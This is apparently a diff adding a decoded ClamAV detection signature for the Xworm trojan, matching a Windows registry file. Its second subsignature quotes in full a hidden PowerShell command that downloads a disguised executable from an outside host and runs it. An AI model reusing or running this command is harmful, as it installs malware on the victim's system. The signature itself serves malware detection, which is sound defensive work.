@@ -1,0 +1,15 @@
+VIRUS NAME: Win.Trojan.Xworm-10016289-0
+TDB: Engine:90-255,Target:0
+LOGICAL EXPRESSION: 0&1
+ * SUBSIG ID 0
+ +-> OFFSET: 0
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+Windows Registry Editor Version 5.00
+
+
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+"serviceup"="cmd.exe /c cd %Public% & powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://drive.serverakp.site/spoolsv.jpg','spoolsv.exe');Start 'spoolsv.exe'& exit"
